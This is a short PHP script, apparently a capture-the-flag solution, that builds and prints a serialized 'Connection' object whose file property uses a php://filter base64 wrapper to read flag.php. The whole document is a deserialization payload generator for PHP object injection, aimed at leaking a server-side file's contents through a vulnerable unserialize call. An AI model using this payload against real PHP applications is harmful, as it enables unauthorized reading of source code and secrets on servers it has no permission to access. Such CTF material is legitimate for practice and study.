<?php

class Connection

{
public $file="php://filter/convert.base64-encode/resource=flag.php";

}

$usr = new Connection();

echo serialize($usr);

?>

?>